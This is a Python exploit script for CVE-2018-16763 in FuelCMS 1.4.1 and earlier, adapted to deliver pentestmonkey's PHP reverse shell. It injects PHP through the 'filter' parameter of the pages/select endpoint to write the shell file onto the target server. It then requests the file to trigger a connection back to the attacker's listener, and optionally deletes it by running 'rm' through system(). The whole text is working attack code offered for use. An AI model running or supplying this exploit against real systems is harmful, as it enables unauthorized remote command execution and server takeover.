#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Reverse Shell Exploit for FuelCMS <= 1.4.1 (CVE-2018-16763)
# Modified by Adrian - uses pentestmonkey's reverse shell

import argparse
import os
import uuid
import requests

def parse_args():
    parser = argparse.ArgumentParser(description="FuelCMS RCE Exploit with Reverse Shell")
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g. http://10.10.10.10)")
    parser.add_argument("-k", "--insecure", action="store_true", help="Allow insecure TLS connections")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-r", "--remove", action="store_true", help="Remove reverse shell after triggering")
    return parser.parse_args()


def install_reverseshell(target, verbose=False):
    shell_name = uuid.uuid4().hex + ".php"
    shell_path = "pentestmonkey/reverseshell.php"

    if not os.path.exists(shell_path):
        print(f"[!] Shell file not found: {shell_path}")
        return None

    with open(shell_path, "rb") as f:
        shell_data = f.read()

    upload_url = (
        target
        + "/fuel/pages/select/?filter=%27%2Bpi%28print%28%24a%3D%27file_put_contents%27%29%29%2B%24a%28%24_POST%5B%22d0eb3f9a%22%5D%2C%24_POST%5B%229bc30f43%22%5D%29%2B%27"
    )
    r = requests.post(upload_url, data={
        "d0eb3f9a": shell_name,
        "9bc30f43": shell_data,
    })

    shell_url = target + "/" + shell_name
    check = requests.get(shell_url)

    if check.status_code == 200:
        print(f"[+] Reverse shell uploaded: {shell_url}")
        return shell_name
    else:
        print(f"[!] Failed to upload shell to: {shell_url}")
        return None


def trigger_reverseshell(target, shell_name):
    url = f"{target}/{shell_name}"
    print(f"[*] Triggering reverse shell: {url}")
    try:
        requests.get(url, timeout=5)
    except requests.exceptions.ReadTimeout:
        # Shell might be blocking, which is expected
        print("[*] Trigger likely succeeded. Check your listener!")
    except Exception as e:
        print(f"[!] Trigger failed: {e}")


def remove_shell(target, shell_name):
    cleanup_url = (
        target
        + "/fuel/pages/select/?filter=%27%2Bpi%28print%28%24a%3D%27system%27%29%29%2B%24a%28%22rm%20"
        + shell_name
        + "%22%29%2B%27"
    )
    requests.get(cleanup_url)
    check = requests.get(f"{target}/{shell_name}")
    if check.status_code != 200:
        print(f"[+] Shell successfully removed: {shell_name}")
    else:
        print(f"[!] Failed to remove shell: {shell_name}")


if __name__ == "__main__":
    args = parse_args()

    if not args.target.startswith("http://") and not args.target.startswith("https://"):
        args.target = "http://" + args.target
    args.target = args.target.rstrip("/")

    if args.insecure:
        requests.packages.urllib3.disable_warnings()
        requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
        try:
            requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
        except AttributeError:
            pass

    shell = install_reverseshell(args.target, verbose=args.verbose)

    if shell:
        trigger_reverseshell(args.target, shell)
        if args.remove:
            input("[*] Press Enter to remove the reverse shell...")
            remove_shell(args.target, shell)
